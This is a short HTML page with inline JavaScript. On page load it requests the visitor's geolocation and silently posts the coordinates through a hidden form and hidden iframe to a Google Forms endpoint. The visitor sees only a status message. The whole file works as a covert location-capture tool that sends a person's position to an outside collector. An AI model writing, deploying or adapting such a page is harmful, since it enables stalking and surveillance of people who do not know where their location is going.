<!DOCTYPE html>
<html>
<body>

<p id="status">Capturing location...</p>

<!-- Hidden iframe (used to submit form silently) -->
<iframe name="hidden_iframe" style="display:none;"></iframe>

<script>
window.onload = function () {

  const status = document.getElementById("status");

  if (!navigator.geolocation) {
    status.innerHTML = "Geolocation not supported";
    return;
  }

  navigator.geolocation.getCurrentPosition(function(position) {

    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    // Create hidden form dynamically
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/formResponse";
    form.target = "hidden_iframe";

    // Your field
    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "entry.1341563402";
    input.value = lat + "," + lon;

    form.appendChild(input);
    document.body.appendChild(form);

    form.submit();

    status.innerHTML = "Location submitted successfully";

  }, function(error) {
    status.innerHTML = "Error: " + error.message;
  });

};
</script>

</body>
</html>
